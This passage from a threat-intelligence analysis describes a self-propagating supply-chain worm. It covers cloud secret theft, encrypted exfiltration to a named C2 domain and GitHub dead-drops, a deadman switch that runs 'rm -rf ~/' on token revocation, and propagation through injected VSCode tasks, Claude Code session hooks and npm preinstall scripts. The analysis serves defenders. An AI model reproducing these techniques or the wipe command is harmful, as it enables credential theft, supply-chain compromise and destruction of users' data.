- **package registry credentials**
- **infrastructure automation tokens**

![](image-148-1024x575.png)

---

## Cloud and Infrastructure Providers

After the initial “quick results” collection phase completes, the framework initializes a second-stage set of providers focused on deeper cloud infrastructure enumeration, secret extraction, and privileged environment access. These modules target enterprise cloud environments, Kubernetes clusters, CI/CD ecosystems, and centralized secret management platforms.

## AWS Provider

The AWS provider implements a comprehensive credential resolution chain designed to maximize access across multiple AWS authentication methods. The framework attempts credential discovery through:

- Environment variables
- Web identity token files
- ECS container metadata endpoints
- EC2 IMDSv2
- Named AWS credential profiles

Once valid credentials are obtained, the toolkit enumerates AWS Secrets Manager and Systems Manager (SSM) Parameter Store across all 17 default AWS regions. Secret retrieval requests are performed with decryption enabled, allowing direct recovery of plaintext secret values.

Notably, the implementation uses a fully custom AWS SigV4 signing mechanism rather than relying on the official AWS SDK. This removes external SDK dependencies, reduces forensic indicators associated with standard libraries, and enables lightweight execution in minimal runtime environments.

![](image-151.png)

## Kubernetes Provider

The Kubernetes provider targets both in-cluster workloads and local developer environments.

The module:

- Reads mounted Kubernetes service account tokens from running containers
- Parses `~/.kube/config` files for bearer tokens and cluster credentials
- Enumerates all namespaces within the cluster
- Retrieves and base64-decodes Kubernetes Secrets across accessible namespaces

The extracted secrets are scanned against a large set of regex patterns designed to identify:

- AWS credentials
- Google Cloud service account JSON keys
- Database connection strings
- Stripe API keys
- Private keys
- Docker authentication tokens
- Additional cloud and infrastructure secrets

This enables broad credential recovery from both production clusters and developer workstations connected to Kubernetes environments.

![](image-150-1024x533.png)

## HashiCorp Vault Provider

The HashiCorp Vault provider attempts authentication through multiple fallback methods, including:

- Environment variable credentials
- Token files across more than 12 candidate filesystem paths
- Kubernetes authentication
- AWS IAM authentication

After successful authentication, the framework:

- Enumerates available KV secret mounts
- Supports both Vault KV v1 and KV v2 engines
- Retrieves up to 100 secrets per mount

This allows the malware to systematically extract centralized infrastructure secrets commonly used in cloud-native and enterprise deployment environments.

![](image-149-1024x519.png)

## Token Scanning and Credential Recycling

All collected provider output is processed through configurable regex-based token matching logic implemented within the base `Provider` class.

The framework actively searches for:

- GitHub Personal Access Tokens (`ghp_`, `gho_`)
- npm authentication tokens (`npm_`)
- GitHub installation tokens (`ghs_`)
- JWT-formatted GitHub Actions runner tokens

Recovered tokens are automatically recycled back into the attack pipeline:

- GitHub tokens trigger the `GitHubActionsService`
- npm tokens activate the `NpmClient` mutation workflow

This creates a self-propagating credential expansion loop in which harvested secrets continuously unlock additional attack surfaces, repositories, package registries, CI/CD pipelines, and cloud infrastructure environments.

The design demonstrates a highly automated post-compromise architecture optimized for recursive credential abuse, infrastructure expansion, and large-scale cloud-native propagation.

---

## Exfiltration Architecture

All collected data is encrypted prior to exfiltration. The framework implements a hybrid encryption model through the `Sender` base class, combining symmetric encryption for payload confidentiality with asymmetric encryption for secure key exchange.

### Encryption Workflow

The exfiltration process follows these steps:

1. Generate a random 32-byte AES key and 12-byte initialization vector (IV)
2. Compress the JSON payload using gzip
3. Encrypt the compressed data using AES-256-GCM
4. Encrypt the AES key using RSA-4096-OAEP with a hardcoded public key (`enc_key.pub`)
5. Construct a final base64-encoded envelope containing:
   - IV
   - ciphertext
   - authentication tag

This design allows efficient encryption of large payloads while ensuring only holders of the corresponding RSA private key can decrypt the collected data.

The dispatcher attempts multiple exfiltration mechanisms in priority order, automatically failing over when a sender becomes unavailable.

![](image-153-1024x642.png)

## Primary Exfiltration Channel: HTTPS C2

The primary exfiltration endpoint for the observed campaign is:

- `git-tanstack[.]com:443/router`

Before transmitting data, the malware performs:

- DNS resolution checks
- HTTP health validation

The health check expects HTTP responses such as `400` or `404`, likely as indicators that the infrastructure is reachable without requiring a dedicated beacon endpoint.

![](image-154-1024x355.png)

## Dynamic C2 Discovery via GitHub

If the primary C2 infrastructure becomes unavailable, the framework activates a fallback discovery mechanism implemented through the `DomainSenderFactory`.

The malware:

1. Searches GitHub commit history for the string:
   - `thebeautifulmarchoftime`
2. Retrieves matching commits through the GitHub commit search API
3. Verifies commit signatures using a second embedded RSA-4096 public key (`verify_key.pub`)
4. Extracts a backup C2 domain from valid signed results

![](image-157.png)

This mechanism allows operators to rotate infrastructure dynamically by publishing signed commits to arbitrary public repositories without requiring hardcoded backup domains within the malware itself.

The use of cryptographically signed infrastructure updates significantly complicates **sinkholing** and **static** indicator-based blocking.

![](image-152-1024x530.png)

## GitHub Dead-Drop Exfiltration

When domain-based exfiltration fails completely, the framework falls back to GitHub itself as a dead-drop communication channel.

Using stolen GitHub authentication tokens, the malware:

- Creates new public repositories
- Uses Dune-themed naming conventions:
  - adjective-noun-number patterns
  - terms such as `sardaukar`, **`mentat`, `ornithopter`**, and `stillsuit`

![](image-155.png)

- Sets repository descriptions to:
  - `Shai-Hulud: Here We Go Again`

Encrypted exfiltration payloads are then committed into a `results/` directory as JSON files.

![](image-156-1024x661.png)

For payloads exceeding approximately 30 MB:

- Data is automatically chunked across multiple files
- File segmentation occurs transparently before upload

This approach allows the operator to retrieve stolen data later by searching GitHub for repositories matching known naming conventions and repository descriptions.

## Token Abuse & Deadman Switch Logic

When the stolen GitHub token belongs to a user account that is not associated with any GitHub organization, the framework activates additional persistence-oriented behavior.

In these cases, the malware:

- Embeds the stolen token in commit messages after applying double Base64 encoding
- Deploys a “deadman switch” persistence mechanism tied to the compromised account

This behavior suggests the framework is designed not only for short-term exfiltration but also for maintaining future access to compromised developer identities and GitHub infrastructure even if primary C2 channels become unavailable.

Overall, the exfiltration architecture demonstrates a resilient multi-layer design that combines:

- encrypted transport
- dynamic infrastructure rotation
- cloud platform abuse
- dead-drop communication techniques
- automated fallback channels

---

## Persistence and the Deadman Switch

The framework implements persistence through two distinct mechanisms designed to maintain long-term execution and enforce token retention following credential theft.

## Background Daemon Persistence

On non-CI systems, persistence is initially established through the `daemonize()` routine. The process forks itself into a detached background child process configured with:

- `stdio: "ignore"`
- environment variable `__DAEMONIZED=1`

![](image-158.png)

The `__DAEMONIZED` flag prevents recursive fork loops and ensures only a single daemonized instance remains active.

To further avoid duplicate execution, the framework creates a PID-based lock file at:

- `/tmp/tmp.ts018051808.lock`

If an active lock already exists, additional instances terminate immediately.

![](image-159-1024x587.png)

## DEADMAN\_SWITCH.sh

The more notable persistence mechanism is implemented through `DEADMAN_SWITCH.sh`, which is deployed whenever the GitHub exfiltration module attaches a stolen GitHub token to an outbound exfiltration envelope.

At the same time credentials are exfiltrated, the malware installs a monitoring daemon responsible for continuously validating the stolen token against the GitHub API.

### macOS Persistence

On macOS systems, the framework creates a LaunchAgent:

- `~/Library/LaunchAgents/com.user.gh-token-monitor.plist`

The LaunchAgent is configured with:

- `RunAtLoad`
- `KeepAlive`

This ensures the monitoring process automatically starts after login and restarts if execution fails unexpectedly.

![](image-161.png)

### Linux Persistence

On Linux systems, persistence is established through a systemd user service:

- `~/.config/systemd/user/gh-token-monitor.service`

The malware additionally executes:

- `11`

This allows the service to continue running independently of active user sessions, enabling persistence even after logout or session termination.

![](image-162.png)

## Token Monitoring Logic

The monitoring daemon polls:

- `https://api.github.com/user`

at one-minute intervals using the stolen GitHub token.

The daemon continuously checks whether the token remains valid. If GitHub returns an HTTP 40x response indicating token revocation or invalidation, the framework executes a configured response handler.

The default configured handler is:

```
rm -rf ~/
```

This behavior effectively turns token revocation into a destructive trigger condition.

![](image-163.png)

## Threat Intent and Destructive Capability

The associated exfiltration commit message explicitly states:

> `IfYouRevokeThisTokenItWillWipeTheComputerOfTheOwner`

While this message may partially function as psychological deterrence intended to discourage victims from revoking compromised credentials, the implementation itself genuinely supports destructive execution behavior. The wipe routine is fully implemented within the codebase and is capable of deleting the user’s home directory upon token invalidation.

To reduce long-term exposure and potentially evade forensic discovery, the monitoring daemon automatically self-terminates after approximately 24 hours regardless of token status.

The persistence design demonstrates a combination of:

- operational stealth
- cloud credential retention
- anti-remediation logic
- destructive coercion mechanisms

![](image-160-1024x345.png)

---

## Credential-Driven Supply Chain Propagation

The mutator subsystem is responsible for transforming harvested credentials into active propagation mechanisms. Once valid GitHub or npm credentials are obtained, the framework weaponizes them to distribute malicious payloads across repositories, package registries, and developer environments.

## Repository Injection Through GitHub Automation Abuse

The primary GitHub propagation component is named `ReadmeUpdater`, a deliberately misleading identifier intended to disguise its true functionality.

Using stolen GitHub authentication tokens, the module pushes malicious files across all accessible branches within targeted repositories. The following files are injected:

| Target Path | Content | Purpose |
| --- | --- | --- |
| `.vscode/tasks.json` | VSCode task configured with `runOn: "folderOpen"` executing `node .claude/setup.mjs` | Automatically triggers payload execution when a developer opens the repository in VSCode |
| `.claude/settings.json` | Claude Code hook executing `node .vscode/setup.mjs` during `SessionStart` | Executes payload automatically when Claude Code initializes |
| `.claude/setup.mjs` | `config.mjs` Node.js loader | Downloads Bun runtime and launches bundled payload |
| `.vscode/setup.mjs` | Duplicate loader implementation | Provides redundant execution path |
| `.claude/<SCRIPT_NAME>` | Compiled malware binary | Main payload executed by loaders |

Commits are attributed to:

- `claude@users.noreply.github.com`

using the commit message:

- `chore: update dependencies`

![](image-164.png)

To reduce operational noise and avoid automated tooling conflicts, the framework excludes branches matching:

- `dependabot/**`
- `copilot/**`

Commit operations are performed through the GitHub **GraphQL API** in batches of two to remain below rate-limiting thresholds.

![](image-165.png)

### IDE and AI-Assisted Development Workflow Abuse

One of the most significant aspects of this propagation strategy is its deliberate targeting of IDE and AI coding assistant automation hooks.

The framework abuses:

- VSCode task execution on repository open
- Claude Code session initialization hooks

As a result, developers who merely clone or open a poisoned repository may execute the malware automatically without requiring additional interaction or explicit script execution.

This represents a notable evolution in supply chain tradecraft, shifting persistence and execution vectors toward modern AI-assisted development tooling and editor automation workflows.

## npm Registry Compromise via Stolen Publish Tokens

When valid npm authentication tokens are identified during credential harvesting, the `NpmClient` mutator validates them against the npm registry API.

The framework verifies:

- **`package:write` permissions**
- **ability to bypass 2FA protections**

It then enumerates all writable packages associated with the compromised token, including organization-scoped packages.

For each writable package, the mutator:

- Downloads the latest published package tarball
- Extracts and modifies `package.json`
- Injects a malicious `preinstall` script:
  - `node setup.mjs`

![](image-167.png)

- Copies the `config.mjs` loader into the package as `setup.mjs`
- Embeds the compiled malware payload
- Increments the patch version
- Republishes the modified package to `npmjs.org`

![](image-168.png)

This allows malicious execution to occur automatically during dependency installation.

## Trusted Publishing Abuse Through OIDC Token Exchange

The framework also contains a specialized `NPMOidcClient` designed specifically for GitHub Actions environments using npm trusted publishing workflows.

When the malware detects execution inside a matching GitHub Actions workflow hardcoded in observed campaigns to `release-drafter.yml` associated with `opensearch-js` it performs the following sequence:

- Requests a GitHub Actions OIDC token scoped for:
  - `npm:registry.npmjs.org`

![](image-171.png)

- Exchanges the OIDC token for an npm publish token through npm’s OIDC token exchange endpoint
- Downloads the target package:
  - `@opensearch-project/opensearch`
- Injects a malicious `optionalDependency` referencing a GitHub commit-based payload
- Increments the package version
- Generates a full Sigstore provenance bundle
- Publishes the modified package with forged provenance metadata attached

![](image-169.png)

---

## Obfuscation and Build-Time Evasion

The framework’s build pipeline is specifically designed to complicate static analysis, reverse engineering, and signature-based detection. Each compiled artifact is uniquely generated, ensuring that builds produced from identical source code still result in substantially different binaries and bundled payloads.

## Dynamic String Encryption

During the build process, the framework generates a fresh random passphrase consisting of 32 random bytes encoded in hexadecimal format. This passphrase is then used as the seed material for a PBKDF2-derived encryption key using:

- 200,000 iterations
- SHA-256

All strings wrapped in the internal **`scramble()`** function are transformed using a per-character polyalphabetic substitution cipher derived from the generated passphrase. During compilation, the original strings are replaced with dynamically generated `beautify()` function calls that reconstruct the values at runtime.

The practical result is that:

- every build produces completely different encoded strings
- identical source code does not produce deterministic output
- static indicators rapidly lose effectiveness across variants

This significantly reduces the reliability of traditional signature-based detections.

![](image-172.png)

## Bundle Obfuscation

The final bundled payloads are additionally processed using:

- **Bun minification**
- `javascript-obfuscator`

Observed obfuscation techniques include:

- **control flow flattening**
- **base64-encoded string arrays**
- **runtime string reconstruction**
- **heavily nested execution paths**

The resulting `router_init.js` bundles, typically around 2.3 MB in size, become resistant to:

- static signature matching
- simple YARA detections
- casual manual reverse engineering

## Embedded Asset Encryption

Supporting assets such as:

- shell scripts
- public keys
- GitHub workflow YAML files
- Python helper utilities

are encrypted independently during the prebuild phase.

Each asset receives:

- a unique AES-256-GCM encryption key
- base64 embedding into `src/generated/index.ts`

At runtime, the framework decrypts these embedded blobs dynamically before execution. This prevents auxiliary payloads and infrastructure artifacts from appearing in plaintext within the compiled bundle.

## Environment Variable Obfuscation

The framework also obfuscates environment variable references during compilation.

For example:

```
process.env.AWS_SECRET_ACCESS_KEY
```

is transformed into:

```
process.env[scramble("AWS_SECRET_ACCESS_KEY")]
```

before the string obfuscation stage is applied.

As a result, even the names of targeted credentials and environment variables are concealed within the final compiled output, significantly reducing the usefulness of static string extraction during malware analysis.

![](image-174.png)

## Build-Time Logging Removal

When the `isSilent` flag is enabled within `logger.ts`, the build pipeline applies an additional transformation step that strips all `logUtil.` function calls from the final bundle.

![](image-173.png)

This removes:

- **debug output**
- **operational logging strings**
- **internal execution traces**

from the compiled artifact entirely.

**The removal of logging functionality further minimizes static indicators while reducing opportunities for analysts to recover execution context or operational metadata from the malware sample.**

---

## Conclusion

Supply chain attacks have become one of the most critical and high-impact threats in modern cybersecurity, driven by the increasing complexity and interconnectivity of software development ecosystems. The incidents and techniques discussed throughout this analysis illustrate how adversaries are shifting their focus away from isolated targets and toward the underlying infrastructure that enables software creation, distribution, and deployment.

Rather than relying on traditional compromise methods, attackers are now leveraging trusted channels such as package registries, CI/CD pipelines, source control platforms, and developer tooling to achieve large-scale impact. This evolution allows a single point of compromise whether through a developer account, automation pipeline, or dependency chain to cascade across multiple organizations and environments.

A defining characteristic of these modern supply chain intrusions is the abuse of trust. Legitimate workflows, automated build systems, and signed artifacts are increasingly being used as vectors for execution and persistence. As a result, distinguishing between normal operational behavior and malicious activity has become significantly more challenging for defenders.

These developments underscore a fundamental shift in the threat landscape: supply chain security is no longer a secondary concern, but a core pillar of organizational defense. The ability of attackers to propagate through trusted systems, reuse valid credentials, and exploit automation highlights the need for stronger identity controls, enhanced visibility across development pipelines, and continuous validation of software integrity from source to deployment.
